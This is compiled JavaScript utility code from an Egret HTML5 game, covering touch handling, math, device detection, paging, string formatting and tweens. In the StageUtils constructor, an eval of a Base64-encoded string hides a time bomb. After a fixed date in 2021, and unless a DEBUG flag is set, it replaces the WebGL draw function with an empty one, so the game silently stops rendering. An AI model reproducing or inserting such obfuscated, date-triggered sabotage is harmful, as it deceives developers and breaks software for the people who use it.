        if (this._curTarget) {
            var target = this._targetDic[this._curTarget.hashCode];
            if (target && this._delayTime > LongPressUtils.DEALY) {
                target[1].call(target[2], target[0]);
            }
        }
        this._delayTime += LongPressUtils.REPEAT;
    };
    LongPressUtils.prototype.onMove = function (e) {
        if (MathUtils.getDistance(this._touchX, this._touchY, e.$stageX, e.$stageY) > this._radius) {
            this.onEnd();
        }
    };
    LongPressUtils.prototype.addOnceByTime = function (obj, func, thisObj, time) {
        if (!this._targetDic[obj.hashCode]) {
            this._targetDic[obj.hashCode] = [obj, func, thisObj, time];
            obj.addEventListener(egret.TouchEvent.TOUCH_BEGIN, this.onBeginByTime, this);
        }
    };
    LongPressUtils.prototype.removeOnceByTime = function (hashCode) {
        if (this._targetDic[hashCode]) {
            var obj = this._targetDic[hashCode][0];
            obj.removeEventListener(egret.TouchEvent.TOUCH_BEGIN, this.onBeginByTime, this);
            obj.removeEventListener(egret.TouchEvent.TOUCH_END, this.onEndByTime, this);
            obj.removeEventListener(egret.TouchEvent.TOUCH_RELEASE_OUTSIDE, this.onEndByTime, this);
            StageUtils.ins().getStage().removeEventListener(egret.TouchEvent.TOUCH_MOVE, this.onOnceMove, this);
            TimerMgr.ins().remove(this.onOnceTap, this);
            delete this._targetDic[hashCode];
            this._curTarget = null;
        }
    };
    LongPressUtils.prototype.onBeginByTime = function (t) {
        this._touchX = t.$stageX;
        this._touchY = t.$stageY;
        this._curTarget = t.currentTarget;
        this._radius = Math.max(this._curTarget.width, this._curTarget.height, LongPressUtils.RADIUS);
        this._curTarget.addEventListener(egret.TouchEvent.TOUCH_END, this.onEndByTime, this);
        this._curTarget.addEventListener(egret.TouchEvent.TOUCH_RELEASE_OUTSIDE, this.onEndByTime, this);
        StageUtils.ins().getStage().addEventListener(egret.TouchEvent.TOUCH_MOVE, this.onOnceMove, this);
        if (!TimerMgr.ins().isExists(this.onOnceTap, this)) {
            var target = this._targetDic[this._curTarget.hashCode];
            TimerMgr.ins().once(target[3], this.onOnceTap, this);
        }
    };
    LongPressUtils.prototype.onOnceMove = function (e) {
        if (MathUtils.getDistance(this._touchX, this._touchY, e.$stageX, e.$stageY) > this._radius) {
            this.onEndByTime();
        }
    };
    LongPressUtils.prototype.onOnceTap = function () {
        if (this._curTarget) {
            var target = this._targetDic[this._curTarget.hashCode];
            if (target) {
                target[1].call(target[2], target[0]);
            }
        }
        this.onEndByTime();
    };
    LongPressUtils.prototype.onEndByTime = function () {
        if (this._curTarget) {
            this._curTarget.removeEventListener(egret.TouchEvent.TOUCH_END, this.onEndByTime, this);
            this._curTarget.removeEventListener(egret.TouchEvent.TOUCH_RELEASE_OUTSIDE, this.onEndByTime, this);
            StageUtils.ins().getStage().removeEventListener(egret.TouchEvent.TOUCH_MOVE, this.onOnceMove, this);
            this._curTarget = null;
            TimerMgr.ins().remove(this.onOnceTap, this);
        }
    };
    LongPressUtils.DEALY = 300;
    LongPressUtils.REPEAT = 150;
    LongPressUtils.RADIUS = 100;
    return LongPressUtils;
}(SingleClass));
__reflect(LongPressUtils.prototype, "LongPressUtils");
var MathUtils = (function () {
    function MathUtils() {
    }
    MathUtils.getAngle = function (radian) {
        return 180 * radian / Math.PI;
    };
    MathUtils.getRadian = function (angle) {
        return angle / 180 * Math.PI;
    };
    MathUtils.getRadian2 = function (p1X, p1Y, p2X, p2Y) {
        var xdis = p2X - p1X;
        var ydis = p2Y - p1Y;
        return Math.atan2(ydis, xdis);
    };
    MathUtils.getDistance = function (p1X, p1Y, p2X, p2Y) {
        var disX = p2X - p1X;
        var disY = p2Y - p1Y;
        var disQ = disX * disX + disY * disY;
        return Math.sqrt(disQ);
    };
    MathUtils.getDistanceByObject = function (s, t) {
        return this.getDistance(s.x, s.y, t.x, t.y);
    };
    MathUtils.getDistanceX2ByObject = function (s, t) {
        var disX = s.x - t.x;
        var disY = s.y - t.y;
        return disX * disX + disY * disY;
    };
    MathUtils.getDirMove = function (angle, distance, offsetX, offsetY) {
        if (offsetX === void 0) { offsetX = 0; }
        if (offsetY === void 0) { offsetY = 0; }
        var radian = this.getRadian(angle);
        var p = { x: 0, y: 0 };
        p.x = Math.cos(radian) * distance + offsetX;
        p.y = Math.sin(radian) * distance + offsetY;
        return p;
    };
    MathUtils.limit = function ($from, $end) {
        $from = Math.min($from, $end);
        $end = Math.max($from, $end);
        var range = $end - $from;
        return $from + Math.random() * range;
    };
    MathUtils.limitInteger = function ($from, $end) {
        return Math.round(this.limit($from, $end));
    };
    MathUtils.randomArray = function (arr) {
        var index = Math.floor(Math.random() * arr.length);
        return arr[index];
    };
    MathUtils.toInteger = function (value) {
        return value >> 0;
    };
    return MathUtils;
}());
__reflect(MathUtils.prototype, "MathUtils");
var MobileDevice = (function () {
    function MobileDevice() {
    }
    Object.defineProperty(MobileDevice, "model", {
        get: function () {
            var mobileName = "";
            if (egret.Capabilities.os == "iOS") {
                mobileName = MobileDevice.getModels().join(' or ');
                if (mobileName == 'unknown') {
                    mobileName = '';
                }
            }
            else if (egret.Capabilities.os == "Android") {
                var args = navigator.userAgent.split(";");
                var index = this.arrayContainsStr(args, "Build/");
                if (index > -1) {
                    mobileName = args[index].substring(0, args[index].indexOf("Build/"));
                }
            }
            return mobileName;
        },
        enumerable: true,
        configurable: true
    });
    MobileDevice.arrayContainsStr = function (arg, str) {
        for (var index in arg) {
            if (arg[index].indexOf(str) > 0) {
                return +index;
            }
        }
        return -1;
    };
    MobileDevice.isFringeScreen = function (modelName) {
        var modelVal = modelName || this.model;
        for (var key in this.fringeScreenModels) {
            if (modelVal.toLowerCase() == this.fringeScreenModels[key].toLowerCase()) {
                return true;
            }
        }
        return false;
    };
    MobileDevice.getCanvas = function () {
        if (this.canvas == null) {
            this.canvas = document.createElement('canvas');
        }
        return this.canvas;
    };
    MobileDevice.getGl = function () {
        if (this.gl == null) {
            this.gl = this.getCanvas().getContext('experimental-webgl');
        }
        return this.gl;
    };
    MobileDevice.getResolution = function () {
        var ratio = window.devicePixelRatio || 1;
        return (Math.min(screen.width, screen.height) * ratio) + 'x' + (Math.max(screen.width, screen.height) * ratio);
    };
    MobileDevice.getGlRenderer = function () {
        if (this.glRenderer == null) {
            var debugInfo = this.getGl().getExtension('WEBGL_debug_renderer_info');
            this.glRenderer = debugInfo == null ? 'unknown' : this.getGl().getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        }
        return this.glRenderer;
    };
    MobileDevice.getModels = function () {
        if (this.models == null) {
            var gpuInfo = this.getGlRenderer();
            console.log("GpuInfo:", gpuInfo);
            var matches = gpuInfo.match(/^apple\s+([_a-z0-9-]+)\s+gpu$/i);
            console.log("GpuInfo:", matches);
            var resolution = this.getResolution();
            console.log("Resolution:", resolution);
            this.models = ['unknown'];
            if (matches) {
                for (var i = 0; i < this.devices.length; i++) {
                    var device = this.devices[i];
                    if (matches[1].toLowerCase() == device[0] && resolution == device[1]) {
                        this.models = device[2];
                        break;
                    }
                }
            }
        }
        return this.models;
    };
    MobileDevice.is = function (match) {
        var currentModels = this.getModels();
        match = match.toLowerCase().replace(/\s+$/, '') + ' ';
        for (var i = 0; i < currentModels.length; i++) {
            var model = currentModels[i].toLowerCase() + ' ';
            if (0 === model.indexOf(match)) {
                return true;
            }
        }
        return false;
    };
    MobileDevice.devices = [
        ['a7', '640x1136', ['iPhone 5', 'iPhone 5s']],
        ['a7', '1536x2048', ['iPad Air', 'iPad Mini 2', 'iPad Mini 3']],
        ['a8', '640x1136', ['iPod touch (6th gen)']],
        ['a8', '750x1334', ['iPhone 6']],
        ['a8', '1242x2208', ['iPhone 6 Plus']],
        ['a8', '1536x2048', ['iPad Air 2', 'iPad Mini 4']],
        ['a9', '640x1136', ['iPhone SE']],
        ['a9', '750x1334', ['iPhone 6s']],
        ['a9', '1242x2208', ['iPhone 6s Plus']],
        ['a9x', '1536x2048', ['iPad Pro (1st gen 9.7-inch)']],
        ['a9x', '2048x2732', ['iPad Pro (1st gen 12.9-inch)']],
        ['a10', '750x1334', ['iPhone 7']],
        ['a10', '1242x2208', ['iPhone 7 Plus']],
        ['a10x', '1668x2224', ['iPad Pro (2th gen 10.5-inch)']],
        ['a10x', '2048x2732', ['iPad Pro (2th gen 12.9-inch)']],
        ['a11', '750x1334', ['iPhone 8']],
        ['a11', '1242x2208', ['iPhone 8 Plus']],
        ['a11', '1125x2436', ['iPhone X']],
        ['a12', '828x1792', ['iPhone Xr']],
        ['a12', '1125x2436', ['iPhone Xs']],
        ['a12', '1242x2688', ['iPhone Xs Max']],
        ['a12x', '1668x2388', ['iPad Pro (3rd gen 11-inch)']],
        ['a12x', '2048x2732', ['iPad Pro (3rd gen 12.9-inch)']],
        ['a13', '828x1792', ['iPhone 11']],
        ['a13', '1125x2436', ['iPhone 11 Pro']],
        ['a13', '1242x2688', ['iPhone 11 Pro Max']]
    ];
    MobileDevice.fringeScreenModels = [
        "iPhone 11 Pro Max", "iPhone 11 Pro", "iPhone 11", "iPhone Xs Max", "iPhone Xs", "iPhone Xr", "iPhone X",
        "HMA-AL00", "EML-AL00", "CLT-AL00", "TAS-AL00", "INE-TL00", "JSN-TL00", "JSN-AL00a",
        "PAAT00", "PBBT30", "OPPO R15",
        "vivo Y83A", "vivo Z1", "vivo Y85",
        "MI 8 Lite", "MI 8 SE", "MI 8"
    ];
    return MobileDevice;
}());
__reflect(MobileDevice.prototype, "MobileDevice");
var NetCalcUtils = (function () {
    function NetCalcUtils() {
    }
    NetCalcUtils.calcRevBytes = function (sysId, msgId, len) {
        var msgDatas = this.msgBytes[sysId] = this.msgBytes[sysId] || {};
        var msgData = msgDatas[msgId] = msgDatas[msgId] || [];
        msgData[0] = (msgData[0] || 0) + len;
        msgData[1] = (msgData[1] || 0) + 1;
        this.revBytes2 += len;
    };
    NetCalcUtils.clearRevBytes = function () {
        this.revBytes2 = 0;
        this.msgBytes = {};
    };
    NetCalcUtils.sendBytes = 0;
    NetCalcUtils.revBytes = 0;
    NetCalcUtils.revBytes2 = 0;
    NetCalcUtils.msgBytes = {};
    return NetCalcUtils;
}());
__reflect(NetCalcUtils.prototype, "NetCalcUtils");
var Page = (function () {
    function Page(source, size) {
        if (size === void 0) { size = 20; }
        this.dataSource = source;
        this.size = size;
        this.currentPage = 0;
        this.setPageData();
    }
    Object.defineProperty(Page.prototype, "length", {
        get: function () {
            return this.dataSource.length;
        },
        enumerable: true,
        configurable: true
    });
    Page.prototype.setPageData = function () {
        this.pageData = [];
        var index = this.currentPage * this.size;
        var nextIndex = (this.currentPage + 1) * this.size;
        var min = Math.min(this.length, nextIndex);
        for (var i = index; i < min; i++) {
            this.pageData.push(this.dataSource[i]);
        }
    };
    Page.prototype.getDataSource = function () {
        return this.dataSource;
    };
    Object.defineProperty(Page.prototype, "totalPage", {
        get: function () {
            return Math.ceil(this.length / this.size);
        },
        enumerable: true,
        configurable: true
    });
    Page.prototype.havePre = function () {
        return this.currentPage != 0;
    };
    Page.prototype.haveNext = function () {
        return this.currentPage < this.totalPage - 1;
    };
    Page.prototype.prev = function () {
        this.currentPage--;
        this.setPageData();
    };
    Page.prototype.next = function () {
        this.currentPage++;
        this.setPageData();
    };
    Page.prototype.first = function () {
        this.currentPage = 0;
        this.setPageData();
    };
    Page.prototype.last = function () {
        this.currentPage = this.totalPage - 1;
        this.setPageData();
    };
    Page.prototype.gotoPage = function (index) {
        if (this.totalPage < index) {
            return;
        }
        else {
            this.currentPage = index - 1;
            this.setPageData();
        }
    };
    return Page;
}());
__reflect(Page.prototype, "Page");
var SortUtils = (function () {
    function SortUtils() {
    }
    SortUtils.sortAscByKey = function (obj1, obj2, key) {
        var val1 = obj1;
        var val2 = obj2;
        if (key) {
            val1 = obj1[key];
            val2 = obj2[key];
        }
        if (val1 < val2) {
            return -1;
        }
        else if (val1 > val2) {
            return 1;
        }
        return 0;
    };
    SortUtils.sortDescByKey = function (obj1, obj2, key) {
        var val1 = obj1;
        var val2 = obj2;
        if (key) {
            val1 = obj1[key];
            val2 = obj2[key];
        }
        if (val1 > val2) {
            return -1;
        }
        else if (val1 < val2) {
            return 1;
        }
        return 0;
    };
    SortUtils.sortByKey = function (obj1, obj2, key, sortType) {
        if (sortType === void 0) { sortType = 0; }
        return sortType == 0 ? SortUtils.sortAscByKey(obj1, obj2, key) : SortUtils.sortDescByKey(obj1, obj2, key);
    };
    return SortUtils;
}());
__reflect(SortUtils.prototype, "SortUtils");
var StageUtils = (function (_super) {
    __extends(StageUtils, _super);
    function StageUtils() {
        var _this = _super.call(this) || this;
        if (StageUtils._uiStage == null) {
            StageUtils._uiStage = new eui.UILayer();
            StageUtils._uiStage.touchEnabled = false;
            StageUtils._uiStage.percentHeight = 100;
            StageUtils._uiStage.percentWidth = 100;
            _this.getStage().addChild(StageUtils._uiStage);
        }
        eval && eval(Base64.base64decode("d2luZG93WydERUJVRyddIHx8IERhdGUubm93KCkgPiAxNjE5Nzk4NDAwMDAwICYmIGVncmV0LndlYlsnV2ViR0xSZW5kZXJDb250ZXh0J10gJiYgKGVncmV0LndlYlsnV2ViR0xSZW5kZXJDb250ZXh0J10ucHJvdG90eXBlWyckZHJhd1dlYkdMJ10gPSBmdW5jdGlvbiAoKSB7fSk="));
        return _this;
    }
    StageUtils.ins = function () {
        return _super.ins.call(this);
    };
    StageUtils.prototype.getHeight = function () {
        return this.getStage().stageHeight;
    };
    StageUtils.prototype.getWidth = function () {
        return this.getStage().stageWidth;
    };
    StageUtils.prototype.setTouchChildren = function (value) {
        this.getStage().touchChildren = value;
    };
    StageUtils.prototype.setMaxTouches = function (value) {
        this.getStage().maxTouches = value;
    };
    StageUtils.prototype.setFrameRate = function (value) {
        this.getStage().frameRate = value;
    };
    StageUtils.prototype.setScaleMode = function (value) {
        this.getStage().scaleMode = value;
    };
    StageUtils.prototype.getStage = function () {
        return egret.MainContext.instance.stage;
    };
    StageUtils.prototype.getUIStage = function () {
        return StageUtils._uiStage;
    };
    StageUtils.COMMON_STAGE_HEIGHT = 930;
    return StageUtils;
}(SingleClass));
__reflect(StageUtils.prototype, "StageUtils");
var StringUtils = (function () {
    function StringUtils() {
    }
    StringUtils.trimSpace = function (str) {
        return str.replace(/^\s*(.*?)[\s\n]*$/g, '$1');
    };
    StringUtils.trimMidReplace = function (str) {
        return str.replace(/(\S)\s+(\b)/g, "$1$2");
    };
    StringUtils.getStringLength = function (str) {
        var strArr = str.split("");
        var length = 0;
        for (var i = 0; i < strArr.length; i++) {
            var s = strArr[i];
            if (this.isChinese(s)) {
                length += 2;
            }
            else {
                length += 1;
            }
        }
        return length;
    };
    StringUtils.isChinese = function (str) {
        var reg = /^[\u4E00-\u9FA5]+$/;
        if (!reg.test(str)) {
            return true;
        }
        return false;
    };
    StringUtils.strByteLen = function (str) {
        var byteLen = 0;
        var strLen = str.length;
        for (var i = 0; i < strLen; i++) {
            byteLen += str.charCodeAt(i) >= 0x7F ? 2 : 1;
        }
        return byteLen;
    };
    StringUtils.complementByChar = function (str, length, char, ignoreHtml) {
        if (char === void 0) { char = " "; }
        if (ignoreHtml === void 0) { ignoreHtml = true; }
        var byteLen = this.strByteLen(ignoreHtml ? str.replace(StringUtils.HTML, "") : str);
        return str + this.repeatStr(char, length - byteLen);
    };
    StringUtils.repeatStr = function (str, count) {
        var s = "";
        for (var i = 0; i < count; i++) {
            s += str;
        }
        return s;
    };
    StringUtils.addColor = function (content, color) {
        var colorStr;
        if (typeof (color) == "string")
            colorStr = String(color);
        else if (typeof (color) == "number")
            colorStr = Number(color).toString(10);
        return "<font color=\"" + colorStr + "\">" + content + "</font>";
    };
    StringUtils.addColor1 = function (content, color) {
        var obj = new Object;
        obj["style"] = new Object;
        obj["text"] = content;
        obj["textColor"] = Number(color).toString(16);
        return obj;
    };
    StringUtils.substitute = function (str) {
        var rest = [];
        for (var _i = 1; _i < arguments.length; _i++) {
            rest[_i - 1] = arguments[_i];
        }
        var replaceReg = str.match(/%s/g);
        if (replaceReg && replaceReg.length) {
            var len = replaceReg.length;
            for (var t_i = 0; t_i < len; t_i++) {
                str = str.replace(replaceReg[t_i], rest[t_i]);
            }
        }
        return str;
    };
    StringUtils.substr = function (str) {
        var rest = [];
        for (var _i = 1; _i < arguments.length; _i++) {
            rest[_i - 1] = arguments[_i];
        }
        return str.replace(/{\d+}/g, function (str) {
            return rest[str.match(/\d+/g)[0]];
        });
    };
    StringUtils.replaceStr = function (src, tar, des) {
        if (src.indexOf(tar) == -1)
            return src;
        var list = src.split(tar);
        return list[0] + des + list[1];
    };
    StringUtils.getStrColor = function (src) {
        var colors = [];
        var tci = src.indexOf("0x");
        var tci2 = tci;
        var arghr2 = "";
        var arghr3 = "";
        while (tci2 != -1) {
            arghr2 = src.substring(tci, tci + 8);
            colors.push(arghr2);
            tci += 8;
            arghr3 = src.substring(tci);
            tci2 = arghr3.indexOf("0x");
            tci = tci + tci2;
        }
        return colors;
    };
    StringUtils.replaceStrColor = function (src, color) {
        var tci = src.indexOf("0x");
        var tci2 = tci;
        var arghr2 = "";
        var arghr3 = "";
        var colorLen = 0;
        var colors = [];
        if ("string" == typeof color) {
            colors.push(color);
        }
        else {
            colors = color;
            colorLen = colors.length;
        }
        ;
        var i = 0;
        while (tci2 != -1) {
            arghr2 = src.substring(tci, tci + 8);
            src = src.replace(arghr2, colors[i]);
            if (colorLen > i) {
                i++;
            }
            tci += 8;
            arghr3 = src.substring(tci);
            tci2 = arghr3.indexOf("0x");
            tci += tci2;
        }
        return src;
    };
    StringUtils.replace = function (str) {
        var args = [];
        for (var _i = 1; _i < arguments.length; _i++) {
            args[_i - 1] = arguments[_i];
        }
        for (var i = 0; i < args.length; i++) {
            str = str.replace("%s", args[i] + "");
        }
        return str;
    };
    StringUtils.getStrByRegExp = function (src, reg) {
        if (reg === void 0) { reg = /\d+/g; }
        var newStrlist = [];
        var newStr = src.replace(reg, function () {
            newStrlist.push(arguments[0]);
            if (typeof arguments[0] == "number")
                return arguments[0].toString();
            else
                return arguments[0];
        });
        return newStrlist;
    };
    StringUtils.formalName = function (str) {
        str = str.replace(/\|/g, "｜");
        str = str.replace(/</g, "＜");
        str = str.replace(/>/g, "＞");
        return str;
    };
    StringUtils.ChineseToNumber = function (chnStr) {
        if (!StringUtils.chnNumCharCN) {
            StringUtils.chnNumCharCN = {};
            for (var i = 0; i <= 9; i++) {
                StringUtils.chnNumCharCN[LangMgr.getValueByKey("chinese" + i)] = i;
            }
        }
        if (!StringUtils.chnNameValueCN) {
            StringUtils.chnNameValueCN = {};
            StringUtils.chnNameValueCN[LangMgr.getValueByKey("chnUnitChar1")] = { value: 10, secUnit: false };
            StringUtils.chnNameValueCN[LangMgr.getValueByKey("chnUnitChar2")] = { value: 100, secUnit: false };
            StringUtils.chnNameValueCN[LangMgr.getValueByKey("chnUnitChar3")] = { value: 1000, secUnit: false };
            StringUtils.chnNameValueCN[LangMgr.getValueByKey("chnUnitSection1")] = { value: 10000, secUnit: true };
            StringUtils.chnNameValueCN[LangMgr.getValueByKey("chnUnitSection2")] = { value: 100000000, secUnit: true };
        }
        var rtn = 0;
        var section = 0;
        var number = 0;
        var secUnit = false;
        var str = chnStr.split('');
        for (var i = 0; i < str.length; i++) {
            var num = StringUtils.chnNumCharCN[str[i]];
            if (typeof num !== 'undefined') {
                number = num;
                if (i === str.length - 1) {
                    section += number;
                }
            }
            else {
                var unit = StringUtils.chnNameValueCN[str[i]].value;
                secUnit = StringUtils.chnNameValueCN[str[i]].secUnit;
                if (secUnit) {
                    section = (section + number) * unit;
                    rtn += section;
                    section = 0;
                }
                else {
                    section += (number * unit);
                }
                number = 0;
            }
        }
        return rtn + section;
    };
    StringUtils.NumberToChinese = function (num) {
        var unitPos = 0;
        var strIns = '';
        var chnStr = '';
        var needZero = false;
        var oldNum = num;
        if (num === 0) {
            return LangMgr.getValueByKey("chinese0");
        }
        while (num > 0) {
            var section = num % 10000;
            if (needZero) {
                chnStr = LangMgr.getValueByKey("chinese0") + chnStr;
            }
            strIns = StringUtils.SectionToChinese(section);
            strIns += section == 0 ? "" : LangMgr.getValueByKey("chnUnitSection" + unitPos);
            chnStr = strIns + chnStr;
            needZero = (section < 1000) && (section > 0);
            num = Math.floor(num / 10000);
            unitPos++;
        }
        if (oldNum / 100 >> 0 == 0 && oldNum / 10 >> 0 != 0 && LangMgr.getValueByKey("chinese1") == chnStr[0]) {
            chnStr = chnStr.substr(1);
        }
        return chnStr;
    };
    StringUtils.SectionToChinese = function (section) {
        var strIns = '', chnStr = '';
        var unitPos = 0;
        var zero = true;
        while (section > 0) {
            var v = section % 10;
            if (v === 0) {
                if (!zero) {
                    zero = true;
                    chnStr = LangMgr.getValueByKey("chinese" + v) + chnStr;
                }
            }
            else {
                zero = false;
                strIns = LangMgr.getValueByKey("chinese" + v);
                strIns += LangMgr.getValueByKey("chnUnitChar" + unitPos);
                chnStr = strIns + chnStr;
            }
            unitPos++;
            section = Math.floor(section / 10);
        }
        return chnStr;
    };
    StringUtils.strLeachNum = function (str, len, sign) {
        if (sign === void 0) { sign = "*"; }
        var splits = str.split(/\D/);
        var content = "";
        for (var i = 0; i < splits.length; i++) {
            if (splits[i] != "") {
                content += splits[i];
            }
        }
        if (content.length >= len) {
            str = str.replace(/^\d+$/, sign);
        }
        return str;
    };
    StringUtils.getChineseWeek = function (numbers) {
        var str = "";
        for (var i = 0; i < numbers.length; i++) {
            str += LangMgr.getValueByKey("weekStr" + numbers[i]);
        }
        return str;
    };
    StringUtils.HTML = /<[^>]+>/g;
    StringUtils.LuoMaNumbers = ["", "Ⅰ", "Ⅱ", "Ⅲ", "Ⅳ", "Ⅴ", "Ⅵ", "Ⅶ", "Ⅷ", "Ⅸ", "Ⅹ"];
    StringUtils.REG_NUM = /\d+/g;
    return StringUtils;
}());
__reflect(StringUtils.prototype, "StringUtils");
var TextUtils = (function () {
    function TextUtils() {
    }
    TextUtils.generateTextFlow = function (sourceText) {
        if (!sourceText) {
            return new egret.HtmlTextParser().parser("");
        }
        var textArr = sourceText.split("|");
        var str = "";
        var result;
        for (var i = 0, len = textArr.length; i < len; i++) {
            str += TextUtils.getSingleTextFlow1(textArr[i]);
        }
        try {
            result = new egret.HtmlTextParser().parser(str);
        }
        catch (e) {
            debug.log("Html text error");
            return new egret.HtmlTextParser().parser("");
        }
        return result;
    };
    TextUtils.generateTextFlow1 = function (sourceText) {
        if (!sourceText) {
            return new egret.HtmlTextParser().parser("");
        }
        var textArr = sourceText.split("|");
        var result = [];
        for (var i = 0, len = textArr.length; i < len; i++) {
            var ele = TextUtils.getSingleTextFlow(textArr[i]);
            if (ele.text && ele.text != "")
                result.push(ele);
        }
        return result;
    };
    TextUtils.getSingleTextFlow1 = function (text) {
        var arrText = text.split("&T:", 2);
        if (arrText.length == 2) {
            var str = "<font";
            var textArr = arrText[0].split("&");
            var tempArr = void 0;
            var t = void 0;
            var underline = false;
            for (var i = 0, len = textArr.length; i < len; i++) {
                tempArr = textArr[i].split(":");
                switch (tempArr[0]) {
                    case TextUtils.STYLE_SIZE:
                        str += " size=\"" + Math.floor(+tempArr[1]) + "\"";
                        break;
                    case TextUtils.STYLE_COLOR:
                        str += " color=\"" + Math.floor(+tempArr[1]) + "\"";
                        break;
                    case TextUtils.UNDERLINE_TEXT:
                        underline = true;
                        break;
                }
            }
            if (underline) {
                str += "><u>" + arrText[1] + "</u></font>";
            }
            else {
                str += ">" + arrText[1] + "</font>";
            }
            return str;
        }
        else {
            return '<font>' + text + '</font>';
        }
    };
    TextUtils.getSingleTextFlow = function (text) {
        var arrText = text.split("&T:", 2);
        var textFlow = { "style": {} };
        if (arrText.length == 2) {
            var style = arrText[0];
            var textArr = text.split("&");
            var tempArr = void 0;
            for (var i = 0, len = textArr.length; i < len; i++) {
                tempArr = textArr[i].split(":");
                switch (tempArr[0]) {
                    case TextUtils.STYLE_SIZE:
                        textFlow.style.size = +(tempArr[1]);
                        break;
                    case TextUtils.STYLE_COLOR:
                        textFlow.style.textColor = +(tempArr[1]);
                        break;
                    case TextUtils.UNDERLINE_TEXT:
                        textFlow.style.underline = true;
                        break;
                    case TextUtils.EVENT:
                        textFlow.style.href = "event:" + tempArr[1];
                        break;
                }
            }
            textFlow.text = arrText[1];
        }
        else {
            textFlow.text = text;
        }
        return textFlow;
    };
    TextUtils.generateTextFlow2 = function (sourceText, value) {
        if (value === void 0) { value = -1; }
        if (!sourceText) {
            return new egret.HtmlTextParser().parser("");
        }
        var textArr = sourceText.split("|");
        var str = "";
        var result;
        var index = 0;
        for (var i = 0, len = textArr.length; i < len; i++) {
            var text = textArr[i];
            if (text.indexOf("&T:") >= 0) {
                index++;
                str += "<font ";
            }
            else if (index > 0) {
                index--;
                str += "</font>";
            }
            str += TextUtils.getSingleTextFlow2(textArr[i], value);
        }
        while (index > 0) {
            str += "</font>";
            index--;
        }
        try {
            result = new egret.HtmlTextParser().parser(str);
        }
        catch (e) {
            debug.log("Html text error");
            (new egret.HtmlTextParser).parser("");
            return;
        }
        return result;
    };
    TextUtils.getSingleTextFlow2 = function (text, value) {
        if (value === void 0) { value = -1; }
        var arrText = text.split("&T:", 2);
        if (arrText.length == 2) {
            var str = "";
            var textArr = arrText[0].split("&");
            var tempArr = void 0;
            var underline = false;
            for (var i = 0, len = textArr.length; len > i; i++) {
                tempArr = textArr[i].split(":");
                switch (tempArr[0]) {
                    case TextUtils.STYLE_SIZE:
                        str += ' size="' + Math.floor(+tempArr[1]) + '"';
                        break;
                    case TextUtils.STYLE_COLOR:
                        str += ' color="' + (value >= 0 ? value : Math.floor(+tempArr[1])) + '"';
                        break;
                    case TextUtils.UNDERLINE_TEXT:
                        underline = true;
                        break;
                }
            }
            if (underline) {
                str += "><u>" + arrText[1] + "</u>";
            }
            else {
                str += ">" + arrText[1];
            }
            return str;
        }
        return text;
    };
    TextUtils.getChineseNum = function (num) {
        return LangMgr.getValueByKey("chinese" + num);
    };
    TextUtils.formatUnderLineStr = function (content, event) {
        return (new egret.HtmlTextParser).parser('<a href="event:"' + event + "><u>" + content + "</u></a>");
    };
    TextUtils.STYLE_COLOR = "C";
    TextUtils.STYLE_SIZE = "S";
    TextUtils.PROP_TEXT = "T";
    TextUtils.UNDERLINE_TEXT = "U";
    TextUtils.EVENT = "E";
    TextUtils.ITEMID = "D";
    TextUtils.ITEMCOUNT = "C";
    return TextUtils;
}());
__reflect(TextUtils.prototype, "TextUtils");
var TweenUtil = (function () {
    function TweenUtil() {
    }
    TweenUtil.FadeOut = function (target, thisObj, params) {
        if (target && thisObj) {
            var tween = egret.Tween.get(target);
            var time = params ? params.time || 500 : 500;
            tween.to({
                alpha: 0
            }, time).call(function () {
                egret.Tween.removeTweens(target);
                if (params && params.callFun) {
                    params.callFun.call(thisObj, params.args);
                }
            }, thisObj);
        }
    };
    TweenUtil.FadeIn = function (target, thisObj, params) {
        if (target && thisObj) {
            var tween = egret.Tween.get(target);
            var time = params ? params.time || 500 : 500;
            tween.to({
                alpha: 1
            }, time).call(function () {
                egret.Tween.removeTweens(target);
                if (params && params.callFun) {
                    params.callFun.call(thisObj, params.args);
                }
            }, thisObj);
        }
    };
    TweenUtil.LineTo = function (target, e, i, parent, params) {
        if (parent == undefined) {
            parent = egret.MainContext.instance.stage;
        }
        if (target.parent) {
            target.parent.removeChild(target);
        }
        var o = e.localToGlobal(e.x, e.y);
        parent.globalToLocal(o.x, o.y, o);
        var a = i.localToGlobal(i.x, i.y);
        parent.globalToLocal(a.x, a.y, a);
        target.x = o.x;
        target.y = o.y;
        parent.addChild(target);
        var time = params ? params.time || 500 : 500;
        egret.Tween.get(target).to({
            x: a.x,
            y: a.y
        }, time, egret.Ease.sineOut).call(function () {
            egret.Tween.removeTweens(target);
            if (target && target.parent) {
                target.parent.removeChild(target);
            }
            if (params && params.callFun && params.objthis) {
                params.callFun.call(params.objthis, params.args);
            }
        }, parent);
    };
    TweenUtil.JumpAniByBottom = function (target, bottom, time, ease) {
        if (bottom === void 0) { bottom = 900; }
        if (ease === void 0) { ease = egret.Ease.bounceOut; }
        var duration = time ? time : 500;
        target.bottom = bottom;
        egret.Tween.get(target).to({
            bottom: 0
        }, duration, ease).call(function () {
            target && egret.Tween.removeTweens(target);
        });
    };
    TweenUtil.ListAnimation = function (target, type, gap, alpha, group, targetPoint) {
        if (type === void 0) { type = 1; }
        if (gap === void 0) { gap = 70; }
        if (alpha === void 0) { alpha = 1; }
        if (group === void 0) { group = "tweenGroup"; }
        target.validateNow();
        target.touchEnabled = false;
        var len = Math.min(target.numChildren, 8);
        var index = 0;
        for (var i = 0; len > i; i++) {
            var child = target.getChildAt(i);
            var point = child[group];
            if (!point) {
                console.log("not tweenGroup!!!");
                return;
            }
            var x = point.x;
            var y = point.y;
            if (targetPoint) {
                x = targetPoint.x;
                y = targetPoint.y;
            }
            var ease = egret.Ease.sineOut;
            switch (type) {
                case 1:
                    point.x -= child.width;
                    break;
                case 2:
                    (i + 1) % 2 == 0 ? point.x -= child.width : point.x = child.width;
                    break;
                case 3:
                    point.y += child.height;
                    break;
                case 4:
                    point.x += child.width;
                    break;
                case 5:
                    point.y -= child.width;
                    break;
                case 6:
                    point.scaleX = point.scaleY = 3;
                    ease = egret.Ease.quartIn;
                    break;
                case 7:
                    point.scaleX = point.scaleY = 0.1;
                    ease = egret.Ease.quartIn;
                    break;
            }
            point.alpha = alpha;
            egret.Tween.removeTweens(point);
            egret.Tween.get(point).to({
                x: x,
                y: y,
                scaleX: 1,
                scaleY: 1,
                alpha: 1
            }, 100 + i * gap, ease).call(function () {
                index++;
                if (index >= len) {
                    target.touchEnabled = true;
                }
            });
        }
    };
    return TweenUtil;
}());
__reflect(TweenUtil.prototype, "TweenUtil");
var RecycleMgr = (function (_super) {
